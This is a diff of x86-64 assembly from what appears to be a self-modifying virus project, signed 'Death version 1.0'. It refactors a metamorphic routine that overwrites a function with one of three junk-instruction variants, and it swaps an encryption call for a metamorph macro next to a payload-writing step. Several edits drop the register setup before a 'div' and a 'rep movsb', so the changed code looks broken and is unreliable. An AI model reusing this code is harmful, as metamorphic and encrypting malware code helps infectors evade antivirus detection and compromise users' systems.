@@ -290,9 +290,8 @@ section .text
 
     __F_mod_functions:
         xor edx, edx
-        lea rsi, [rel Traza]
-        movzx eax, byte [rsi + Traza_len + 1]
-        mov ebx, 3
+        lea r8, [rel Traza]
+        movzx eax, byte [r8 + Traza_len + 1]
         div ebx
 
         ; multiplicamos dl * F_crazy_len
@@ -305,10 +304,7 @@ section .text
         ; rsi + (dl * F_crazy_len) => direccion de memoria de la funcion a copiar como __F_crazy
         ; rdi                      => direccion de memoria de la __F_crazy a sobreescribir
         ; memcpy(__F_crazy, __F_crazy0 + rax, F_crazy_len);
-        lea rsi, [rel __F_crazy0]
         add rsi, rax
-        lea rdi, [rel __F_crazy]
-        mov rcx, F_crazy_len
         cld
         rep movsb
         ret
@@ -776,12 +772,10 @@ section .text
         CALL_ENCRYPT(set_unique_trace)
 
 	.mod_functions:
-        CALL_ENCRYPT(mod_functions)
+        CALL_METAMORPH(crazy, 3)
 
     .encrypt_data_block:
         CALL_ENCRYPT(encrypt_block) ; encripta
-
-        ; Encriptar data
 
     .write_payload:
         lea rsi, _start
@@ -873,7 +867,7 @@ section .text
     Traza           db      "Death version 1.0 (c)oded by tomartin & carce-bo 42069420",0  ;46
     Traza_len       equ     $ - Traza - 1 - 8 - 1
 
-    __F_crazy0:
+    __F_crazy_0:
         dec rax
         inc rax
         nop
@@ -898,9 +892,9 @@ section .text
         not rax
         cmp rbx, rsi
         ret
-    __F_crazy0__end:
+    __F_crazy_0__end:
 
-    __F_crazy1:
+    __F_crazy_1:
         inc rdx
         inc rax
         dec rax
@@ -925,9 +919,9 @@ section .text
         not rax
         cmp rbx, rsi
         ret
-    __F_crazy1__end:
+    __F_crazy_1__end:
 
-    __F_crazy2:
+    __F_crazy_2:
         nop
         inc rax
         dec rax
@@ -952,6 +946,6 @@ section .text
         not rax
         cmp rbx, rsi
         ret
-    __F_crazy2__end:
+    __F_crazy_2__end:
 
     _finish:
